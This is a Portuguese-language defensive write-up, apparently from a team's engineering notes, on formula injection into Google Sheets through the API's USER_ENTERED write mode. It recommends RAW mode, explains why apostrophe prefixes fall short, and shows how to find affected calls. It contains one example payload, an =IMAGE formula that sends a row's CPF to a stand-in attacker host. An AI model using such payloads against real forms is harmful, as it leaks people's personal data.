## `valueInputOption=USER_ENTERED` transforma qualquer formulário público num sink de injeção de fórmula no Google Sheets {#user-entered-no-sheets-e-sink-de-injecao-de-formula}

`tags: google sheets, injecao, formula, seguranca, formulario publico, LGPD, PII, R23`

**Sintoma:** nenhum. É o problema — não há erro, log ou comportamento estranho. A planilha recebe
as linhas normalmente e só se comporta mal quando um humano a abre.

**Mecanismo:** a Sheets API v4 aceita dois modos de escrita. Com `valueInputOption=USER_ENTERED`,
o Google **interpreta** o valor como se tivesse sido digitado por uma pessoa: uma célula que começa
com `=` vira fórmula. Se a origem do valor é um formulário público sem autenticação, o atacante
escolhe a fórmula.

```
Nome: =IMAGE("https://servidor-dele.tld/x?d="&R2)
```

Quando alguém do time abre a planilha, o Sheets busca a "imagem" — e o CPF da linha 2 vai embutido
na URL. Sem clique, sem macro, sem aviso. `=IMPORTRANGE`, `=HYPERLINK` e `=IMPORTDATA` servem ao
mesmo fim. Numa planilha que guarda CPF e endereço de terceiros, isso é vazamento de dado pessoal
por design da integração.

**Segundo dano, não relacionado a ataque:** `USER_ENTERED` também reinterpreta datas. Uma célula
gravada como `04/09/2026` numa planilha com locale en-US vira 9 de abril. Todo o cuidado de
formatar em `America/Sao_Paulo` no servidor é desfeito na escrita.

**Correção:** `valueInputOption=RAW`. O valor é armazenado como texto, sem parsing — fecha os dois
problemas de uma vez. Praticamente nenhuma integração de formulário precisa de parsing: as máscaras
já produzem o texto final desejado.

**Cuidado com o "escape" reflexo:** prefixar a célula com apóstrofo (`'`) é o truque conhecido para
neutralizar fórmula — mas ele só funciona sob `USER_ENTERED`, onde o Sheets consome o apóstrofo
como marcador de texto. Sob `RAW` o apóstrofo **fica visível na célula**. Pior, um regex amplo tipo
`/^[=+\-@]/` corrompe dado legítimo: chave PIX de telefone se escreve `+5567996275319`, e prefixar
isso quebra justamente a coluna que a operação usa para pagar alguém.

Se quiser defesa em profundidade (para o caso de alguém reverter o modo de escrita no futuro),
restrinja a `/^[=@]/` — os dois caracteres que só aparecem em ataque ou erro de digitação — e
documente na função que **o controle real é o `RAW`**, não o prefixo.

**Onde procurar:** qualquer chamada a `spreadsheets.values.append` ou `.update` cuja origem seja
input de usuário não autenticado. `grep -rn valueInputOption` resolve.
